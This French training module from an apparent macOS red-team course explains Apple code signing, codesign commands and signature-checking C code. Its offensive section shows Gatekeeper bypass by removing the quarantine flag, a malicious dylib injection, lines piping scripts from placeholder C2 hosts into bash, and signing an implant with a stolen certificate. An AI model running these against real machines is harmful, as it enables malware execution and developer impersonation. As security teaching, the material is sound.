# Module M05 : Code Signing - Signature de Code sur macOS

## Objectifs

A la fin de ce module, vous serez capable de :
- Comprendre le système de code signing d'Apple et son rôle sécuritaire
- Signer des binaires avec certificats et entitlements
- Vérifier et extraire les signatures de code
- Contourner ou abuser du code signing en contexte offensif
- Créer des ad-hoc signatures pour le développement

## 1. Introduction au Code Signing

### 1.1 Qu'est-ce que le Code Signing ?

Imaginez un **sceau de cire** sur une lettre royale. Le sceau prouve que :
1. La lettre vient bien du roi (authentification)
2. Personne n'a modifié la lettre (intégrité)

**Code Signing** = signature cryptographique attachée à un binaire qui prouve :
- **Qui** a créé le programme (identité développeur)
- Que le code n'a **pas été modifié** depuis la signature
- Quelles **permissions** (entitlements) le programme demande

```ascii
ANALOGIE : SCEAU ROYAL

┌─────────────────────────────────┐
│  LETTRE (Binaire)               │
│                                 │
│  "Accordez accès au trésor"     │
│  (Code demandant accès Keychain)│
│                                 │
│  ┌───────────────────────┐      │
│  │  🏰 SCEAU DU ROI      │      │
│  │  (Code Signature)     │      │
│  │  - Signé par: Apple   │      │
│  │  - Cert ID: XYZ123    │      │
│  │  - Hash: SHA256...    │      │
│  └───────────────────────┘      │
└─────────────────────────────────┘

Garde (macOS) vérifie le sceau avant exécution
```

### 1.2 Pourquoi Code Signing en Offensive Security ?

En Red Team, le code signing est **crucial** :

**Défensif** :
- Empêche l'exécution de malware non signé (Gatekeeper)
- Limite les permissions via entitlements
- Détecte modifications de binaires légitimes

**Offensif** :
- **Bypass Gatekeeper** : contourner la vérification
- **Privilege Escalation** : abuser d'entitlements sur binaires signés
- **Living off the Land** : utiliser binaires Apple légitimes signés
- **Malware Signing** : signer nos payloads pour éviter détection

## 2. Concepts Fondamentaux

### 2.1 Anatomie d'une Signature de Code

```ascii
STRUCTURE CODE SIGNATURE

┌─────────────────────────────────────────────────┐
│           MACH-O BINARY                         │
├─────────────────────────────────────────────────┤
│  __TEXT Segment (Code)                          │
│  __DATA Segment (Données)                       │
├─────────────────────────────────────────────────┤
│  __LINKEDIT Segment                             │
│    ┌─────────────────────────────────────┐      │
│    │  CODE SIGNATURE BLOB                │      │
│    ├─────────────────────────────────────┤      │
│    │  1. Code Directory                  │      │
│    │     - Hashes de toutes les pages    │      │
│    │     - Hash __TEXT: 0xABCD...        │      │
│    │     - Hash __DATA: 0x1234...        │      │
│    │                                     │      │
│    │  2. Requirements                    │      │
│    │     - Règles de validation          │      │
│    │                                     │      │
│    │  3. Entitlements (plist XML)        │      │
│    │     <key>com.apple.security.cs     │      │
│    │          .allow-jit</key>          │      │
│    │     <true/>                         │      │
│    │                                     │      │
│    │  4. CMS Signature                   │      │
│    │     - Certificat développeur        │      │
│    │     - Signature RSA/ECDSA           │      │
│    │     - Chaîne de confiance Apple     │      │
│    └─────────────────────────────────────┘      │
└─────────────────────────────────────────────────┘
```

### 2.2 Types de Signatures

```ascii
TYPES DE CODE SIGNING

┌──────────────────────────────────────────────────────┐
│ 1. AD-HOC SIGNATURE (Développement)                  │
│    - Signature locale sans certificat                │
│    - Commande : codesign -s - binary                 │
│    - Usage : tests locaux, pas d'App Store           │
│    - Identité : "-" (tiret)                          │
├──────────────────────────────────────────────────────┤
│ 2. DEVELOPER ID (Distribution externe)               │
│    - Certificat Apple Developer payant               │
│    - Notarization requise (scan malware Apple)       │
│    - Bypass Gatekeeper si notarisé                   │
│    - Identité : "Developer ID Application: ..."      │
├──────────────────────────────────────────────────────┤
│ 3. APP STORE SIGNATURE                               │
│    - Pour App Store uniquement                       │
│    - Sandboxing obligatoire                          │
│    - Entitlements strictes                           │
│    - Identité : "3rd Party Mac Developer ..."        │
├──────────────────────────────────────────────────────┤
│ 4. APPLE SIGNATURE (Système)                         │
│    - Réservé aux binaires Apple                      │
│    - Protégé par SIP                                 │
│    - Entitlements privilégiés                        │
└──────────────────────────────────────────────────────┘
```

### 2.3 Entitlements - Permissions Spéciales

Les **entitlements** sont des permissions déclarées dans la signature.

```ascii
FONCTIONNEMENT ENTITLEMENTS

Sans entitlements :
┌──────────┐      Accès Keychain ?      ┌──────────┐
│  App.app │─────────────────────────────│  macOS   │
└──────────┘            ❌               └──────────┘
              "Non autorisé"

Avec entitlement :
┌──────────┐      Accès Keychain ?      ┌──────────┐
│  App.app │─────────────────────────────│  macOS   │
│ [Signed] │            ✅               │          │
│ keychain-│         "Autorisé"          │          │
│  access  │                             │          │
└──────────┘                             └──────────┘
```

**Entitlements Communs** :

```xml
<!-- Accès Keychain -->
<key>keychain-access-groups</key>
<array>
    <string>$(AppIdentifierPrefix)com.example.app</string>
</array>

<!-- Debugging d'autres processus -->
<key>com.apple.security.cs.debugger</key>
<true/>

<!-- JIT Compilation (pour langages dynamiques) -->
<key>com.apple.security.cs.allow-jit</key>
<true/>

<!-- Désactiver library validation (injection DYLIB) -->
<key>com.apple.security.cs.disable-library-validation</key>
<true/>

<!-- Hardened Runtime désactivé -->
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
```

## 3. Mise en Pratique - Outils codesign

### 3.1 Vérifier une Signature

```bash
# Vérifier si signé
codesign -dv /Applications/Safari.app
# Output:
# Executable=/Applications/Safari.app/Contents/MacOS/Safari
# Identifier=com.apple.Safari
# Format=app bundle with Mach-O universal (x86_64 arm64e)
# Authority=Software Signing
# Authority=Apple Code Signing Certification Authority
# Authority=Apple Root CA

# Vérifier validité
codesign --verify --verbose /Applications/Safari.app
# Sortie vide = OK
# Erreur = signature invalide

# Afficher entitlements
codesign -d --entitlements :- /Applications/Safari.app
# Output: XML plist des entitlements
```

### 3.2 Signer un Binaire (Ad-hoc)

```bash
# Compilation simple
cat > hello.c << 'EOF'
#include <stdio.h>
int main() {
    printf("Hello, macOS!\n");
    return 0;
}
EOF

gcc hello.c -o hello

# IMPORTANT : Sur macOS moderne, obligatoire de signer
./hello  # Peut échouer si non signé

# Signature ad-hoc (développement local)
codesign -s - hello

# Vérifier
codesign -dv hello
# Identifier=hello
# Format=Mach-O thin (arm64)
# Signature=adhoc  ← Ad-hoc signature
```

### 3.3 Signer avec Entitlements

```bash
# Créer fichier entitlements.plist
cat > entitlements.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-jit</key>
    <true/>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
</dict>
</plist>
EOF

# Signer avec entitlements
codesign -s - --entitlements entitlements.plist hello

# Vérifier entitlements appliqués
codesign -d --entitlements :- hello
```

### 3.4 Retirer une Signature

```bash
# Retirer signature (pour modification)
codesign --remove-signature hello

# Modifier binaire
echo "PATCHED" >> hello

# Re-signer
codesign -s - hello
```

## 4. Programmation - API Code Signing

### 4.1 Vérifier Signature en C

```c
#include <Security/Security.h>
#include <stdio.h>

void check_signature(const char *path) {
    SecStaticCodeRef staticCode = NULL;
    OSStatus status;

    // Créer référence au code
    CFURLRef url = CFURLCreateFromFileSystemRepresentation(
        NULL, (UInt8*)path, strlen(path), false
    );

    status = SecStaticCodeCreateWithPath(url, kSecCSDefaultFlags, &staticCode);
    CFRelease(url);

    if (status != errSecSuccess) {
        printf("[-] Erreur création code ref\n");
        return;
    }

    // Vérifier signature
    status = SecStaticCodeCheckValidity(
        staticCode,
        kSecCSDefaultFlags,
        NULL  // Requirements (NULL = default)
    );

    if (status == errSecSuccess) {
        printf("[+] Signature VALIDE\n");
    } else {
        printf("[-] Signature INVALIDE : %d\n", status);
    }

    CFRelease(staticCode);
}

int main() {
    check_signature("/Applications/Safari.app");
    check_signature("/tmp/malware");
    return 0;
}
```

Compiler :
```bash
gcc -framework Security check_sig.c -o check_sig
```

### 4.2 Extraire Entitlements en C

```c
#include <Security/Security.h>
#include <CoreFoundation/CoreFoundation.h>

void extract_entitlements(const char *path) {
    SecStaticCodeRef staticCode = NULL;
    CFDictionaryRef info = NULL;
    OSStatus status;

    CFURLRef url = CFURLCreateFromFileSystemRepresentation(
        NULL, (UInt8*)path, strlen(path), false
    );

    SecStaticCodeCreateWithPath(url, kSecCSDefaultFlags, &staticCode);
    CFRelease(url);

    // Obtenir informations de signature
    status = SecCodeCopySigningInformation(
        staticCode,
        kSecCSSigningInformation,  // Flag
        &info
    );

    if (status != errSecSuccess) {
        printf("[-] Pas de signature\n");
        CFRelease(staticCode);
        return;
    }

    // Extraire entitlements
    CFDictionaryRef entitlements = CFDictionaryGetValue(
        info,
        kSecCodeInfoEntitlementsDict
    );

    if (entitlements) {
        printf("[+] Entitlements trouvés :\n");
        CFShow(entitlements);  // Affiche le dictionnaire
    } else {
        printf("[-] Pas d'entitlements\n");
    }

    CFRelease(info);
    CFRelease(staticCode);
}
```

### 4.3 Vérifier si Binaire est Hardened Runtime

```c
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include <fcntl.h>
#include <sys/mman.h>

bool is_hardened_runtime(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return false;

    struct stat st;
    fstat(fd, &st);

    void *file = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);

    struct mach_header_64 *header = (struct mach_header_64*)file;

    // Parcourir load commands
    struct load_command *lc = (struct load_command*)(header + 1);

    for (uint32_t i = 0; i < header->ncmds; i++) {
        if (lc->cmd == LC_CODE_SIGNATURE) {
            struct linkedit_data_command *sig =
                (struct linkedit_data_command*)lc;

            // Vérifier flags Hardened Runtime
            // (analyse simplifiée, réalité plus complexe)
            munmap(file, st.st_size);
            return true;  // Signé = probablement hardened
        }
        lc = (struct load_command*)((char*)lc + lc->cmdsize);
    }

    munmap(file, st.st_size);
    return false;
}
```

## 5. Applications Offensives

### 5.1 Énumération - Trouver Binaires avec Entitlements Dangereux

```bash
#!/bin/bash
# Scanner tous les binaires système pour entitlements à risque

for app in /Applications/*.app; do
    ent=$(codesign -d --entitlements :- "$app" 2>/dev/null)

    # Chercher entitlements dangereux
    if echo "$ent" | grep -q "com.apple.security.cs.disable-library-validation"; then
        echo "[!] DYLIB INJECTION POSSIBLE : $app"
    fi

    if echo "$ent" | grep -q "com.apple.security.cs.debugger"; then
        echo "[!] DEBUGGER ENTITLEMENT : $app"
    fi

    if echo "$ent" | grep -q "com.apple.security.get-task-allow"; then
        echo "[!] TASK_FOR_PID ALLOWED : $app"
    fi
done
```

### 5.2 Bypass Gatekeeper - Signature Invalide Technique

**Technique 1 : Abuser de xattr (Quarantine Flag)**

```bash
# Téléchargement normal = quarantine flag
curl -o malware https://evil.com/payload
ls -l@ malware
# com.apple.quarantine ← Flag présent

# macOS refuse exécution
./malware  # "macOS cannot verify developer"

# BYPASS : Retirer quarantine
xattr -d com.apple.quarantine malware

# Maintenant exécutable
./malware  # Fonctionne !
```

**Technique 2 : Archive ZIP (préserve pas quarantine)**

```bash
# Créer ZIP
zip payload.zip malware

# Transférer ZIP (pas de quarantine sur archives)
# Dézipper
unzip payload.zip

# Pas de quarantine flag !
./malware  # Bypass Gatekeeper
```

### 5.3 DYLIB Hijacking sur Binaires avec disable-library-validation

Si un binaire signé a `disable-library-validation`, on peut injecter des DYLIB non signées.

```bash
# Trouver binaire vulnérable
codesign -d --entitlements :- /Applications/Vulnerable.app/Contents/MacOS/Vulnerable \
  | grep disable-library-validation

# Créer DYLIB malicieuse
cat > inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
void inject() {
    printf("[INJECTED] Code malicieux exécuté !\n");
    system("osascript -e 'display dialog \"Pwned!\"'");
}
EOF

gcc -dynamiclib inject.c -o malicious.dylib

# Injecter avec DYLD_INSERT_LIBRARIES
DYLD_INSERT_LIBRARIES=./malicious.dylib \
  /Applications/Vulnerable.app/Contents/MacOS/Vulnerable
```

### 5.4 Living off the Land - Abuser Binaires Apple Signés

Utiliser binaires Apple légitimes pour exécution de code.

```bash
# EXEMPLE : osascript (signé Apple)
osascript -e 'do shell script "curl http://c2.com/beacon | bash"'

# EXEMPLE : python3 (signé Apple)
/usr/bin/python3 -c 'import socket; ...'  # Reverse shell

# EXEMPLE : curl (signé Apple)
curl http://c2.com/stage2.sh | bash

# Avantages :
# - Binaires signés = pas d'alerte Gatekeeper
# - Binaires système = difficile à blocker
# - Pas besoin de dropper notre binaire
```

### 5.5 Signer un Implant avec Certificat Volé

```bash
# Supposons certificat volé : stolen_cert.p12

# Importer dans Keychain
security import stolen_cert.p12 -k ~/Library/Keychains/login.keychain

# Lister identités disponibles
security find-identity -v -p codesigning

# Signer notre implant
codesign -s "Developer ID Application: Victim Inc" implant

# Vérifier
codesign -dv implant
# Authority=Developer ID Application: Victim Inc
# Authority=Developer ID Certification Authority
# Authority=Apple Root CA

# Implant paraît légitime !
```

## 6. Détection et Défense

### 6.1 Détecter Binaires Non Signés

```bash
# Scanner processus en cours
ps aux | while read line; do
    pid=$(echo $line | awk '{print $2}')
    proc=$(ps -p $pid -o comm=)

    if codesign --verify "$proc" 2>&1 | grep -q "invalid"; then
        echo "[!] Processus non signé : $proc (PID $pid)"
    fi
done
```

### 6.2 Monitorer Modifications de Signatures

```bash
# Créer baseline des signatures
find /Applications -name "*.app" -exec codesign -dv {} \; 2>&1 > baseline.txt

# Plus tard, comparer
find /Applications -name "*.app" -exec codesign -dv {} \; 2>&1 > current.txt
diff baseline.txt current.txt
```

### 6.3 Protections macOS

```ascii
DÉFENSES CODE SIGNING

┌─────────────────────────────────────────────────┐
│ GATEKEEPER                                      │
│   → Vérifie signature au 1er lancement         │
│   → Nécessite Developer ID ou App Store        │
│   → Bypass : xattr, ZIP, curl pipe bash        │
├─────────────────────────────────────────────────┤
│ NOTARIZATION                                    │
│   → Scan malware par Apple avant distribution  │
│   → Obligatoire depuis macOS 10.15              │
│   → Bypass : certificats anciens, ad-hoc local  │
├─────────────────────────────────────────────────┤
│ HARDENED RUNTIME                                │
│   → Limite injection mémoire, DYLD_*, debugger  │
│   → Activé par défaut Developer ID              │
│   → Bypass : entitlements, exploits kernel      │
├─────────────────────────────────────────────────┤
│ LIBRARY VALIDATION                              │
│   → Seules DYLIB signées même dev peuvent load  │
│   → Protège contre DYLIB hijacking              │
│   → Bypass : disable-library-validation ent     │
└─────────────────────────────────────────────────┘
```

## 7. Checklist Compétences

Avant de passer au module suivant, vérifiez que vous savez :

- [ ] Expliquer le rôle du code signing sur macOS
- [ ] Vérifier signature d'un binaire avec `codesign`
- [ ] Signer un binaire avec signature ad-hoc
- [ ] Créer et appliquer des entitlements
- [ ] Extraire entitlements d'un binaire signé
- [ ] Identifier binaires avec entitlements dangereux
- [ ] Bypasser Gatekeeper (xattr, archives)
- [ ] Comprendre Hardened Runtime et ses implications

## 8. Exercices

Voir [exercice.md](exercice.md)

## 9. Ressources

- [Code Signing Guide - Apple](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/)
- [Entitlements Database](https://newosxbook.com/ent.jl) - Jonathan Levin
- [Bypassing Gatekeeper](https://blog.malwarebytes.com/mac/2021/02/new-macos-backdoor-found-in-mac-app/)
- [Objective-See Tools](https://objective-see.com/tools.html) - Analyse code signing
- [codesign man page](https://www.manpagez.com/man/1/codesign/)

---

**Navigation**
- [Module précédent](../M04_mach_ports/)
- [Module suivant](../M06_xpc_basics/)
